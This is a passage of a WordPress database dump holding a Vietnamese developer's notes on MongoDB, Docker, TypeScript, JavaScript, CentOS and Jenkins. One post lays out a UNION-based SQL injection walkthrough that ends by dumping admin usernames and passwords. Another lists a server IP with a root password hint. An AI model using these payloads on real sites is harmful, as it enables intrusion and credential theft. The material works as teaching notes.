\'$tabId\', emojis: { $push: \'$$ROOT\' } } },\r\n    {\r\n        $lookup: {\r\n            from: \'rocketchat_custom_emoji_tab\',\r\n            localField: \'_id\',\r\n            foreignField: \'_id\',\r\n            as: \'tab\',\r\n        },\r\n    },\r\n    {\r\n        $project: {\r\n            _id: false,\r\n            emojis: 1,\r\n            tab: 1,\r\n            tabName: {\r\n                $cond: [{ $gt: [{ $size: \'$tab\' }, 0] }, { $arrayElemAt: [\'$tab.tabName\', 0] }, \'Smilemates\'],\r\n            },\r\n        },\r\n    },\r\n    { $sort: { tabName: 1 } },\r\n]).pretty()\r\n</pre>\r\n\r\n<h2>2. Sử dụng Aggregate</h2>\r\n<pre>\r\nthis.model.rawCollection().aggregate([\r\n    { $sort: { _updatedAt: -1 } },\r\n    {\r\n        $group: { _id: \'$tabId\', emojis: { $push: \'$$ROOT\' } },\r\n    },\r\n    {\r\n        $lookup: {\r\n            from: EmojiCustomTab.collectionName,\r\n            localField: \'_id\',\r\n            foreignField: \'_id\',\r\n            as: \'tab\',\r\n        },\r\n    },\r\n    {\r\n        $project: {\r\n            _id: false,\r\n            emojis: 1,\r\n            tab: 1,\r\n            tabName: {\r\n                $cond: [{ $gt: [{ $size: \'$tab\' }, 0] }, { $arrayElemAt: [\'$tab.tabName\', 0] }, \'\'],\r\n            },\r\n            tabId: {\r\n                $cond: [{ $gt: [{ $size: \'$tab\' }, 0] }, { $arrayElemAt: [\'$tab._id\', 0] }, \'\'],\r\n            },\r\n        },\r\n    },\r\n]).toArray();\r\n\r\nthis.model.rawCollection().aggregate([\r\n    { $match: { _id } },\r\n    {\r\n        $lookup: {\r\n            from: EmojiCustomTab.collectionName,\r\n            localField: \'tabId\',\r\n            foreignField: \'_id\',\r\n            as: \'tab\',\r\n        },\r\n    },\r\n    {\r\n        $addFields: {\r\n            tabName: {\r\n                $cond: [{ $gt: [{ $size: \'$tab\' }, 0] }, { $arrayElemAt: [\'$tab.tabName\', 0] }, \'Smilemates\'],\r\n            },\r\n            tabId: {\r\n                $cond: [{ $gt: [{ $size: \'$tab\' }, 0] }, { $arrayElemAt: [\'$tab._id\', 0] }, \'\'],\r\n            },\r\n        },\r\n    },\r\n]).toArray();\r\n</pre>', 'MongoDB - Một số lệnh Shell', '', 'publish', 'open', 'open', '', 'mongodb-mot-so-lenh-shell', '', '', '2022-10-14 04:30:52', '2022-10-14 04:30:52', '', 0, 'https://duycode.com/?p=2234', 0, 'post', '', 0),
(2245, 1, '2022-05-27 13:54:11', '2022-05-27 06:54:11', 'Một số nguyên tắc\r\n- Kết thúc lệnh bằng: \"-- \"(có dấu cách) để toàn bộ đoạn sau thành comment\r\n<pre>\r\n\r\n\r\n// Thử search trên ô tìm kiếm\r\nmay tho\'\r\n# You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near \'\'\' at line 1\r\n# SELECT * FROM tblsanpham WHERE status=1 AND title LIKE \'%man\'%\'\r\n\r\n// Thử tiếp (nhớ có dấu cách cuối câu lệnh) xem có thành công không\r\nmay tho%\' UNION SELECT * FROM tblsanpham WHERE status=1 AND title LIKE \'%mau%\' -- \r\n\r\n// Tìm kiếm xem câu select trước đó có bao nhiêu field\r\n// Thay đổi số lượng số 1 đến khi đủ field thì thôi (như trường hợp này ta dò được 16 field)\r\nmay tho%\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 -- \r\n# The used SELECT statements have a different number of columns\r\n# SELECT * FROM tblsanpham WHERE status=1 AND title LIKE \'%may tho%\' UNION SELECT 1,2,3,4 -- %\'\r\n\r\n// Tiếp tục đổi từng field để lấy thêm thông tin Database\r\nmay tho%\' UNION SELECT 1,Database(),3,4,5,6,@@version,8,9,10,11,12,13,14,15,16 -- \r\n\r\n// Lấy danh sách các table_name trong database\r\nmay tho%\' UNION SELECT 1,Database(),3,4,5,6,table_name,8,9,10,11,12,13,14,15,16 FROM information_schema.tables -- \r\n\r\n// Lấy danh sách các column_name trong một table (ví dụ table có tên \'tbladmin\')\r\nmay tho%\' UNION SELECT 1,Database(),3,4,5,6,column_name,8,9,10,11,12,13,14,15,16 FROM information_schema.columns WHERE table_name=\'tbladmin\' -- \r\n\r\n// Lấy danh sách bản ghi trong table \'tbladmin\'\r\nmay tho%\' UNION SELECT 1,name,3,4,5,6,pass,8,9,10,11,12,13,14,15,16 FROM tbladmin -- \r\n\r\n// Lấy nhiều hơn\r\nmay tho%\' UNION SELECT 1,name,3,4,5,6,pass,8,9,10,11,12,13,14,15,16 FROM tbladmin UNION SELECT 1,role,3,4,5,6,status,8,9,10,11,12,13,14,15,16 FROM tbladmin -- \r\n\r\n\r\n</pre>', 'SQL Injection', '', 'publish', 'open', 'open', '', 'sql-injection', '', '', '2022-05-27 17:11:50', '2022-05-27 10:11:50', '', 0, 'https://duycode.com/?p=2245', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(2257, 1, '2022-06-06 20:10:44', '2022-06-06 13:10:44', '<h2>1. Chuẩn bị</h2>\r\n-- Lấy các images về\r\n<pre>\r\n// fpm là dịch vụ tạo ra nhiều tiến trình có sẵn\r\ndocker pull php:7.3-fpm\r\ndocker pull httpd\r\ndocker pull mysql\r\n\r\n// Tạo 1 network dùng chung cho các container: www-net\r\ndocker network create --driver bridge www-net\r\ndocker network ls\r\n</pre>\r\n\r\n-- Tạo thư mục: C:\\Docker\\mycode sẽ làm bộ nhớ cho các container\r\n\r\n-- Tạo file test C:\\Docker\\mycode\\www\\test.php\r\n<pre>\r\n<?php\r\n    echo \"ApacheHTTPD\";\r\n    phpinfo();\r\n</pre>\r\n\r\n<h2>2. Tạo container: c-php tự động lắng nghe trên cổng 9000</h2>\r\n<pre>\r\n// Tạo container: -d: chạy nền luôn ( khác với -it: chạy và vào terminal)\r\ndocker run -d --name c-php -h php -v C:\\Docker\\mycode:/home/mycode --network www-net php:7.3-fpm\r\n\r\n// Vào container và chạy thử bash\r\ndocker exec -it c-php bash\r\n# php --version\r\n# cd /home/mycode/www\r\n# php test.php\r\n\r\n// Cài thêm lệnh ping\r\n# apt update\r\n# apt install iputils-ping\r\n\r\n// Kiểm tra các extension được nạp cùng php\r\n# php -m\r\n// Cài thêm extension cho php chạy được mysql\r\n# docker-php-ext-install mysqli\r\n# docker-php-ext-install pdo_mysql\r\n# exit\r\n\r\ndocker restart c-php\r\n</pre>\r\n\r\n<h2>3. Tạo container c-httpd</h2>\r\n-- 3.1. Copy file cấu hình của httpd\r\n<pre>\r\ndocker run --rm -v C:\\Docker\\mycode:/home/mycode httpd cp /usr/local/apache2/conf/httpd.conf /home/mycode\r\n</pre>\r\n\r\n-- 3.2. Sửa file C:\\Docker\\mycode\\httpd.conf để sử dụng proxy trong apache\r\n<pre>\r\n// Bỏ comment những đoạn sau\r\nLoadModule proxy_module modules/mod_proxy.so\r\nLoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so\r\n\r\n// thêm vào cuối file\r\nAddHandler \"proxy:fcgi://c-php:9000\" .php\r\n\r\n// Đổi thư mục làm việc mặc định\r\n# DocumentRoot \"/usr/local/apache2/htdocs\"\r\n# <Directory \"/usr/local/apache2/htdocs\">\r\n\r\n// Khởi động bằng file index.php\r\n<IfModule dir_module>\r\n    DirectoryIndex index.html index.php\r\n</IfModule>\r\n\r\nDocumentRoot \"/home/mycode/www\"\r\n<Directory \"/home/mycode/www\">\r\n</pre>\r\n\r\n-- 3.3 Tạo container\r\n<pre>\r\ndocker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v C:\\Docker\\mycode:/home/mycode/ -v C:\\Docker\\mycode\\httpd.conf:/usr/local/apache2/conf/httpd.conf httpd\r\n</pre>\r\n\r\n-- *Dùng trình duyệt truy cập http://localhost:9999 và http://localhost:9999/test.php để xem kết quả\r\n\r\n<h2>4. Tạo container c-mysql tự động lắng nghe trên cổng 3306</h2>\r\n-- 4.1. Copy file cấu hình của mysql\r\n<pre>\r\ndocker run --rm -v C:\\Docker\\mycode:/home/mycode mysql cp /etc/mysql/my.cnf /home/mycode/\r\n</pre>\r\n\r\n-- 4.2. Sửa file cấu hình C:\\Docker\\mycode\\my.cnf để hoạt động với phiên bản mysql xác thực cũ\r\n<pre>\r\n// Thêm vào cuối file\r\ndefault-authentication-plugin=mysql_native_password\r\n</pre>\r\n\r\n-- 4.3. Tạo thư mục C:/Docker/mycode/db => mục đích để lưu db vào đó, nếu lỡ xóa container mysql thì vẫn còn db\r\n\r\n-- 4.4. Tạo container\r\n<pre>\r\ndocker run -e MYSQL_ROOT_PASSWORD=abc123 -v C:\\Docker\\mycode\\my.cnf:/etc/mysql/my.cnf -v C:\\Docker\\mycode\\db:/var/lib/mysql --name c-mysql mysql\r\ndocker network connect www-net c-mysql\r\n\r\n// Test thử c-mysql hoạt động\r\ndocker exec -it c-mysql bash\r\n\r\n// Kết nối tới database với root@abc123\r\n# mysql -uroot -pabc123\r\nmysql> SHOW DATABASES\r\nmysql> USE mysql;\r\nmysql> SHOW TABLES;\r\n\r\n// Tạo user và db mới\r\nmysql> CREATE DATABASE wp_wordpress;\r\nmysql> CREATE USER \'testuser\'@\'%\' IDENTIFIED BY \'testpass\';\r\n\r\n// Cấp toàn quyền cho user\r\nmysql> GRANT ALL PRIVILEGES ON wp_wordpress.* TO \'testuser\'@\'%\';\r\nmysql> FLUSH PRIVILEGES;\r\nmysql> exit\r\n\r\n// Kết nối lại bằng testuser\r\n# mysql -utestuser -ptestpass\r\nmysql> SHOW DATABASES\r\n</pre>\r\n\r\n<h2>5. Sử dụng Wordpress</h2>\r\n- Download mã nguồn từ trang chủ: <a href=\"https://wordpress.org/download/\" rel=\"noopener\" target=\"_blank\">https://wordpress.org/download/</a>\r\n- Đưa toàn bộ source code wordpress vào C:\\Docker\\mycode\\www\r\n- Vào trình duyệt: http://localhost:9999/index.php\r\n- Bắt đầu cài đặt worpress với thông số\r\n<pre>\r\nDatabase Name: wp_wordpress\r\nUsername: testuser\r\nPassword: testpass	\r\nDatabase Host: c_mysql\r\nTable Prefix: wp_\r\n</pre>\r\n', 'Docker – 6: Thực hành với PHP', '', 'publish', 'open', 'open', '', 'docker-6-thuc-hanh-voi-php', '', '', '2022-06-17 06:03:52', '2022-06-16 23:03:52', '', 0, 'https://duycode.com/?p=2257', 0, 'post', '', 0),
(2259, 1, '2022-06-08 10:55:59', '2022-06-08 03:55:59', '- React Portal: dùng khi tạo Modal hoặc tooltip --> thẻ div đứng ngang #root', 'ReactJS - Other', '', 'publish', 'open', 'open', '', 'reactjs-other', '', '', '2022-06-08 10:55:59', '2022-06-08 03:55:59', '', 0, 'https://duycode.com/?p=2259', 0, 'post', '', 0),
(2281, 1, '2022-09-15 05:00:09', '2022-09-15 05:00:09', '<h2>1. Tạo 1 image từ 1 container</h2>\r\n-- Tạo 1 container tên cent từ image centos\r\n<pre>\r\ndocker pull centos:centos7\r\ndocker run -it --name cent centos:centos7\r\n# yum update -y\r\n# yum install httpd httpd-tools -y\r\n# yum install vim -y\r\n# yum install epel-release -y\r\n# yum update -y\r\n# yum install htop -y\r\n// Kiểm tra xem đã cài hoàn thành httpd, vim và htop chưa\r\n# httpd -v\r\n# vi\r\n# htop\r\n// Ctrl + P + Q để ra khỏi container\r\n\r\ndocker cp C:\\Docker\\mycode\\myimage\\test.html cent:/var/www/html/\r\ndocker attach cent\r\n# cd /var/www/html\r\n# ls\r\n# exit\r\n</pre>\r\n\r\n-- Commit container cent thành image có tên myimage:v1\r\n<pre>\r\ndocker commit cent myimage:v1\r\ndocker images\r\n// Tạo luôn 1 container chạy máy chủ httpd và chạy nền\r\ndocker run --rm -p 9876:80 myimage:v1 httpd -D FOREGROUND\r\n</pre>\r\n\r\n<h2>2. Tạo image từ Dockerfile</h2>\r\n-- Tạo file\r\n<pre>\r\ncd C:\\Docker\\mycode\\myimage\r\n// Tạo Dockerfile trên PowerShell\r\nNew-Item Dockerfile\r\n// Tạo Dockerfile trên Linux\r\ntouch Dockerfile\r\n</pre>\r\n\r\n-- Chỉnh sửa Dockerfile\r\n<pre>\r\nFROM centos:centos7\r\n\r\nRUN yum update -y\r\nRUN yum install httpd httpd-tools -y\r\nRUN yum install vim -y\r\nRUN yum install epel-release -y\r\nRUN yum update -y\r\nRUN yum install htop -y\r\n\r\n# Thư mục làm việc mặc định\r\nWORKDIR /var/www/html\r\n# Image này hoạt động và lắng nghe trên cổng 80\r\nEXPOSE 80\r\n\r\n# Copy file test html vào thư mục var/www/html\r\nADD ./test.html /var/www/html/\r\n\r\n# Container được tạo mặc định sẽ chạy httpd với tham số -D FOREGROUND\r\nENTRYPOINT [ \"httpd\" ]\r\nCMD [ \"-D\", \"FOREGROUND\" ]\r\n</pre>\r\n-- Tạo image từ Dockerfile\r\n<pre>\r\n# -t: tên image, -f: tên file, .: thư mục hiện tại\r\ndocker build -t myimage:v1 -f Dockerfile .\r\n# Kiểm tra lại image\r\ndocker image history myimage:v1\r\n# Tạo thử 1 container\r\ndocker run -p 6789:80 myimage:v1\r\n</pre>\r\n\r\n\r\n<h2> * Khác. Lưu 1 container thành 1 Images</h2>\r\n<pre>\r\n// Tạo 1 container dựa trên image: ubuntu:18.04\r\n$ sudo docker run -it --name \"TestUbuntu\" ubuntu:18.04\r\n\r\n// Khởi động bash trong ubuntu\r\n$ sudo docker exec -it TestUbuntu bash\r\n// Cài đặt htop\r\nroot@testubuntu:/# apt update -y\r\nroot@testubuntu:/# apt install htop\r\nroot@testubuntu:/# htop\r\n\r\n// Cài đặt Ping, Vim\r\nroot@testubuntu:/# apt install iputils-ping\r\nroot@testubuntu:/# apt install vim\r\n\r\n// Container này đang cài đặt khá nhiều chương trình rồi -> cần lưu container này lại\r\n// Tạo 1 images my-ubuntu:version1 từ container TestUbuntu\r\n$ sudo docker commit TestUbuntu my-ubuntu:version1\r\n\r\n// Kiểm tra lại các images của dọcker\r\n$ sudo docker images\r\n\r\n// Lưu image thành 1 file my-ubuntu.tar\r\n$ cd ~/Downloads\r\n$ sudo docker save --output my-ubuntu.tar e03f35874101\r\n\r\n// Tạo image từ file tar\r\n$ sudo docker load -i my-ubuntu.tar\r\n\r\n// Đặt lại tên và version\r\n$ docker tag e03f35874101 my-ubuntu:version2\r\n</pre>\r\n', 'Docker – 5: Dockerfile', '', 'publish', 'open', 'open', '', 'docker-5-dockerfile', '', '', '2022-10-11 10:10:30', '2022-10-11 10:10:30', '', 0, 'https://duycode.com/?p=2281', 0, 'post', '', 0),
(2293, 1, '2022-05-15 08:00:25', '2022-05-15 01:00:25', '<h2>Exclude</h2>\r\n<pre>\r\n### Exclude\r\ntype NumberOrString = number | string\r\ntype RemoveString = Exclude<NumberOrString, string> // tương đương:  = number\r\nconst demo1: RemoveString = 100 // ==> đúng\r\nconst demo2: RemoveString = \'a\' // ==> lỗi, vì đã loại bỏ type string\r\n</pre>\r\n\r\n<h2>Sử dụng keyof và typeof</h2>\r\n<pre>\r\ntype Student = {\r\n	name: string;\r\n	age: number;\r\n}\r\ntype KeyOfStudent = keyof Student // tương đương: = \"name\" | \"age\"\r\n\r\nenum ESort {\r\n	ASC = \'asc\',\r\n	DESC = \'desc\'\r\n}\r\ntype KeyOfESort = keyof ESort // tương đương: = \"toString\" | \"slice\" | \"indexOf\" | \"charAt\" | \"charCodeAt\" | ...\r\ntype KeyOfTypeOfESort = keyof typeof ESort // tương đương: = \"ASC\" | \"DESC\"\r\n\r\nconst xx: typeof ESort = {\r\n	// ASC: \'asc\',  // lỗi\r\n	// ASC: ESort.DESC,  // lỗi\r\n	ASC: ESort.ASC,\r\n	DESC: ESort.DESC,\r\n}\r\n\r\nenum EGender {\r\n	ASC = \'asc\',\r\n	DESC = 1\r\n}\r\ntype KeyOfEGender = keyof EGender // tương đương: = \"toString\" | \"valueOf\"\r\ntype KeyOfTypeOfEGender = keyof typeof EGender // tương đương: = \"ASC\" | \"DESC\"\r\n\r\nconst yy: typeof EGender = {\r\n	// ASC: \'xyz\',  // lỗi\r\n	// ASC: \'asc\',  // lỗi\r\n	// ASC: ESort.DESC,  // lỗi\r\n	// DESC: 1, // ok\r\n	// DESC: 2, // lỗi\r\n	ASC: EGender.ASC, // ok\r\n	DESC: EGender.DESC, // ok\r\n}\r\n\r\ntype KeyOfAny = keyof any // tương đương: = string | number | symbol\r\nconst keyOfAny1: KeyOfAny = \'xx\' // ok\r\nconst keyOfAny2: KeyOfAny = 12 // ok\r\nconst keyOfAny3: KeyOfAny = [] // lỗi\r\n</pre>\r\n\r\n<h2> Sử dụng [P in keyof XXX]</h2>\r\n<pre>\r\ntype Student = {\r\n	name: string;\r\n	age: number;\r\n}\r\ntype StudentExtend = {\r\n	[P in keyof Student]: string;\r\n}\r\n// tương đương với\r\n// type StudentExtend = {\r\n//     name: string;\r\n//     age: string;\r\n// }\r\n\r\nenum ESort {\r\n	ASC = \'asc\',\r\n	DESC = \'desc\',\r\n}\r\ntype ESortExtend = {\r\n	[P in keyof typeof ESort]: string;\r\n}\r\n// tương đương với\r\n// type ESortExtend = {\r\n//     readonly ASC: string;\r\n//     readonly DESC: string;\r\n// }\r\ntype ESortExtendError = {\r\n	[P in keyof ESort]: string;\r\n}\r\n// tương đương với\r\n// type ESortExtendError = {\r\n//     [x: number]: string;\r\n//     toString: string;\r\n//     charAt: string;\r\n//     charCodeAt: string;\r\n//     ...more...;\r\n//     at: string;\r\n// }\r\n</pre>\r\n\r\n\r\n<pre>\r\n// keyof và typeof\r\n## Sử dụng [P in keyof Student]\r\ntype Student = {\r\n	name: string;\r\n	age: number;\r\n}\r\ntype InStudent = {\r\n	[P in keyof Student]: string;\r\n}\r\ntype ForbidStudent = {\r\n	[P in keyof Student]: never;\r\n}\r\nconst demoInStudent: InStudent = {\r\n	name: \'Hoàng\', // ok\r\n	age: \'xxx\', // ok\r\n	// age: 12, // lỗi\r\n}\r\nconst demoForbid: ForbidStudent = {\r\n	name: \'Hoàng\', // lỗi name phải là type never\r\n	address: \'xxx\', // lỗi address không tồn tại trong type\r\n}\r\n\r\n## Trường hợp tiếp theo\r\nenum ESort {\r\n	ASC = \'asc\',\r\n	DESC = \'desc\'\r\n}\r\nenum EGender {\r\n	MALE = \'male\',\r\n	FEMALE = 0\r\n}\r\ntype ESortType = {\r\n	mark: typeof ESort; // tương đương: = \'object\'\r\n}\r\ntype ESortKeyof = {\r\n	mark: keyof ESort; // tương đương: nhận giá trị là tất cả key trong string\r\n	hair: keyof EGender; // tương đương: nhận giá trị là tất cả key trong string\r\n}\r\ntype ESortKeyType = {\r\n	mark: keyof typeof ESort; // tương đương: = \'ASC\' | \'DESC\'\r\n}\r\n\r\nconst eSortType1: ESortType = { mark: \'xx\' } // lỗi, vì mark phải là object\r\nconst eSortType2: ESortType = { mark: { abc: \'xx\' } } // lỗi, mark là object, nhưng phải là type ESort\r\nconst eSortType3: ESortType = { mark: { ASC: \'xx\' } } // lỗi, xx phải là value của ESort\r\nconst eSortType: ESortType = { mark: { ASC: ESort.ASC, DESC: ESort.DESC } }\r\n\r\nconst eSortKey1: ESortKeyof = {\r\n	// mark: \'xyz\' // lỗi\r\n	// mark: 4, // ok\r\n	mark: \'substring\', // nhận tất cả các giá trị là property của string\r\n	hair: \'toString\', // chỉ còn nhận \'toString\' và \'valueOf\'\r\n}\r\n\r\nconst eSortKeyType1: ESortKeyType = { mark: \'ASC\' } // ok\r\nconst eSortKeyType2: ESortKeyType = { mark: \'EQ\' } // lỗi\r\n</pre>\r\n', 'Typescript - Ghi chú về Enum, Type, Interface', '', 'publish', 'open', 'open', '', 'docker-8-example-docker-compose', '', '', '2023-08-08 16:20:20', '2023-08-08 16:20:20', '', 0, 'https://duycode.com/?p=2293', 0, 'post', '', 0),
(2317, 1, '2022-07-27 03:23:15', '2022-07-27 03:23:15', '<h2>1. Debounce</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<body>\r\n    <button id=\"btn-debounce\">Button Debounce</button>\r\n    <script>\r\n        const debounce = (func, delay) => {\r\n            let timeout;\r\n            return (...args) => {\r\n                if (timeout) {\r\n                    clearTimeout(timeout);\r\n                }\r\n                timeout = setTimeout(() => {\r\n                    func(...args);\r\n                    timeout = null;\r\n                }, delay);\r\n            };\r\n        };\r\n\r\n        const senDataDebounce = debounce((data) => {\r\n            console.log(\'Send data debounce:\', data);\r\n        }, 1000);\r\n\r\n        document.getElementById(\'btn-debounce\').onclick = () => {\r\n            senDataDebounce(new Date())\r\n        }\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n<h2>2. Throttle</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<body>\r\n    <button id=\"btn-throttle\">Button Throttle</button>\r\n    <script>\r\n        const throttle = (func, delay) => {\r\n            let lastCall = 0;\r\n\r\n            return function (...args) {\r\n                const now = new Date().getTime();\r\n\r\n                if (now - lastCall >= delay) {\r\n                    lastCall = now;\r\n                    return func(...args);\r\n                }\r\n            };\r\n        }\r\n\r\n        const senDataThrottle = throttle((data) => {\r\n            console.log(\'Send data throttle:\', data);\r\n        }, 1000);\r\n\r\n        document.getElementById(\'btn-throttle\').onclick = () => {\r\n            senDataThrottle(new Date())\r\n        }\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'Debounce và Throttle trong JavaScript', '', 'publish', 'open', 'open', '', 'debounce-va-throttle-trong-javascript', '', '', '2022-07-27 03:23:22', '2022-07-27 03:23:22', '', 0, 'https://duycode.com/?p=2317', 0, 'post', '', 0),
(2347, 1, '2022-08-06 09:59:31', '2022-08-06 09:59:31', '<h2>1. Cơ bản</h2>\r\n<pre>\r\n// SSH vào OS, password: abc123..\r\nssh root@103.124.93.214\r\n\r\n// Check hệ điều hành\r\nhostnamectl\r\n\r\n// Check IP Centos\r\nhostname -i\r\nifconfig\r\nip a\r\nip addr\r\ncurl ifconfig.co\r\ncurl ifconfig.me\r\n\r\n// Đổi mật khẩu root\r\npasswd\r\n\r\n// Kiểm tra tình trạng máy\r\ntop\r\n// Kiểm tra dung lượng ổ đĩa\r\ndf -h\r\ndu -h --max-depth=1\r\n\r\n// Kiểm tra các chương trình đã cài trên CentOs\r\nyum list installed\r\n\r\n// Kiểm tra các service\r\nsudo systemctl\r\n// Khi jenkins start bị limit\r\nsudo systemctl reset-failed jenkins.service\r\n\r\n// Check thư mục chạy câu lệnh\r\nwhich npm\r\nwhich node\r\n\r\n// Kiểm tra các cổng đang mở\r\nsudo netstat -tulpn | grep LISTEN\r\n-t : All TCP ports\r\n-u : All UDP ports\r\n-l : Display listening server sockets\r\n-p : Show the PID and name of the program to which each socket belongs\r\n-n : Don’t resolve names\r\n</pre>\r\n\r\n<h2>2. Cài đặt Docker</h2>\r\n<a href=\"https://docs.docker.com/engine/install/centos/\" rel=\"noopener\" target=\"_blank\">https://docs.docker.com/engine/install/centos/</a>', 'CentOS - Cơ bản', '', 'publish', 'open', 'open', '', 'centos-co-ban', '', '', '2022-10-28 07:54:24', '2022-10-28 07:54:24', '', 0, 'https://duycode.com/?p=2347', 0, 'post', '', 0),
(2439, 1, '2022-06-15 04:00:11', '2022-06-15 04:00:11', '<pre>\r\ndocker-compose ps\r\ndocker-compose ps --service\r\n\r\ndocker-compose up\r\ndocker-compose up --build\r\n\r\n// Dừng và xóa container, network\r\ndocker-compose down\r\ndocker-compose down --rmi all -v --remove-orphans\r\n// -- rmi all : Remove all images\r\n// -v : Remove the named volumes declared in the volumes section of docker-compose.yml and the anonymous volumes attached to the container\r\n// --remove-orphans : Remove containers not defined in docker-compose.yml\r\n\r\ndocker-compose stop\r\ndocker-compose start\r\ndocker-compose restart\r\n\r\ndocker-compose images\r\n\r\n// Thực hiện lệnh bash trong service my-php\r\ndocker-compose exec my-php bash\r\n\r\n// Đọc log tất cả, -t: time, -f: realtime\r\ndocker-compose logs -t -f\r\n// Đọc log ở service my-php và service my-httpd\r\ndocker-compose logs my-php my-httpd\r\n</pre>', 'Docker – 4: docker-compose', '', 'publish', 'open', 'open', '', 'docker-4-docker-compose', '', '', '2022-09-21 03:01:15', '2022-09-21 03:01:15', '', 0, 'https://duycode.com/?p=2439', 0, 'post', '', 0),
(2492, 1, '2022-10-01 03:00:08', '2022-10-01 03:00:08', '1. docker-hub https://hub.docker.com/r/jenkins/jenkins\r\n$ sudo docker pull jenkins/jenkins:jdk11\r\n\r\n<h2>Example</h2>\r\n1. Example 1\r\n<pre>\r\npipeline {\r\n    agent any\r\n    environment {\r\n        BUILD_VERSION = \"${TAG == \'\' ? currentBuild.number : TAG}\"\r\n        TYPE_NAME=\"schat_v5_test\"\r\n        // thư mục sau khi build (trong docker container)\r\n        BUILD_DIRECTORY=\"~/Schat.Rocket.Chat/build/$TYPE_NAME\"\r\n        // thư mục volume với host (trong docker container)\r\n        BUILD_VOLUME=\"~/build/$TYPE_NAME\"\r\n\r\n        DOCKER_REGISTRY_URL = \"sgmgmtregistry.azurecr.io\"\r\n        DOCKER_REGISTRY_CREDENTIAL_ID = \"dockerRegistry.sgh\"\r\n        // thư mục build image (ngoài host)\r\n        IMAGE_DIRECTORY=\"/home/schatadmin/apps/build/$TYPE_NAME\"\r\n        IMAGE_NAME_TAG=\"$DOCKER_REGISTRY_URL/$TYPE_NAME:${BUILD_VERSION}\"\r\n\r\n        SCHAT_SERVER_TEST = \"dev-schat02\"\r\n\r\n        dockerImage = \"\"\r\n    }\r\n\r\n    stages {\r\n        stage(\'Git checkout branch\') {\r\n            steps {\r\n                sh \'echo \"Start checkout brand\"\'\r\n                sh \"\"\"docker exec schat_v5 bash -c \'\\\r\n                    source .profile \\\r\n                    && cd ~/Schat.Rocket.Chat \\\r\n                    && git reset --hard\\\r\n                    && git gc --prune=now \\\r\n                    && git remote prune origin \\\r\n                    && git fetch --all \\\r\n                    && git checkout origin/$GIT_BRANCH \\\r\n                    \'\"\"\"\r\n                // git url: GIT_URL, credentialsId: GIT_CREDENTIAL_ID, branch: GIT_BRANCH\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    sh \'echo \"Git checkout false\"\'\r\n                }\r\n\r\n                unstable {\r\n                    sh \'echo \"Git checkout false\"\'\r\n                }\r\n            }\r\n        }\r\n        \r\n        stage(\'Yarn install\') {\r\n            steps {\r\n                sh \'echo \"Start yarn install\"\'\r\n                script {\r\n                    if (YARN_REINSTALL == \'true\') {\r\n                        sh \"\"\"docker exec schat_v5 bash -c \'\\\r\n                            source .profile \\\r\n                            && cd ~/Schat.Rocket.Chat/ \\\r\n                            && rm -rf ./node_modules/ \\\r\n                            && rm -rf ./apps/meteor/node_modules/ \\\r\n                            && { nvm use $NODEJS_VERSION || nvm install $NODEJS_VERSION; } \\\r\n                            && { yarn || { npm i -g yarn && yarn; }; } \\\r\n                            \'\"\"\"\r\n                        // sh \"yarn cache clean --all\"\r\n                    }\r\n                }\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                   sh \'echo \"Yarn install false\"\'\r\n                }\r\n\r\n                unstable {\r\n                    sh \'echo \"Yarn install unstable\"\'\r\n                }\r\n            }\r\n        }\r\n        \r\n        stage(\'Yarn build\') {\r\n            steps {\r\n                sh \'echo \"Start yarn build\"\'\r\n                sh \"\"\"docker exec schat_v5 bash -c \'\\\r\n                    source .profile \\\r\n                    && cd ~/Schat.Rocket.Chat/ \\\r\n                    && nvm use $NODEJS_VERSION \\\r\n                    && yarn build\\\r\n                    \'\"\"\"\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    sh \'echo \"Yarn build failure\"\'\r\n                }\r\n\r\n                unstable {\r\n                    sh \'echo \"Yarn build unstable\"\'\r\n                }\r\n            }\r\n        }\r\n        \r\n        stage(\'Meteor build\') {\r\n            steps {\r\n                sh \'echo \"Start meteor build\"\'\r\n                sh \"\"\"docker exec schat_v5 bash -c \'\\\r\n                    source .profile \\\r\n                    && cd ~/Schat.Rocket.Chat/apps/meteor \\\r\n                    && rm -rf $BUILD_DIRECTORY \\\r\n                    && nvm use $NODEJS_VERSION \\\r\n                    && meteor build --directory $BUILD_DIRECTORY\\\r\n                    \'\"\"\"\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    sh \'echo \"Meteor build failure\"\'\r\n                }\r\n\r\n                unstable {\r\n                    sh \'echo \"Meteor build unstable\"\'\r\n                }\r\n            }\r\n        }\r\n        \r\n        stage(\'Docker build image\') {\r\n            steps {\r\n                sh \'echo \"Start docker build image\"\'\r\n                sh \"\"\"docker exec schat_v5 bash -c \'\\\r\n                    sudo rm -rf $BUILD_VOLUME \\\r\n                    && sudo cp -R $BUILD_DIRECTORY $BUILD_VOLUME \\\r\n                    && sudo cp ~/Schat.Rocket.Chat/apps/meteor/.docker/Dockerfile $BUILD_VOLUME\\\r\n                    \'\"\"\"\r\n                script {\r\n                    dockerImage = docker.build(IMAGE_NAME_TAG, IMAGE_DIRECTORY)\r\n                }\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    sh \'echo \"Docker build image failure\"\'\r\n                }\r\n\r\n                unstable {\r\n                    sh \'echo \"Docker build image unstable\"\'\r\n                }\r\n                success {\r\n                    sh \'echo \"Docker build image success\"\'\r\n                }\r\n            }\r\n        }\r\n        \r\n        stage(\'Docker push to Registry\') {\r\n            steps {\r\n                sh \'echo \"Docker build image start\"\'\r\n                script {\r\n                    docker.withRegistry(\'https://\' + DOCKER_REGISTRY_URL, 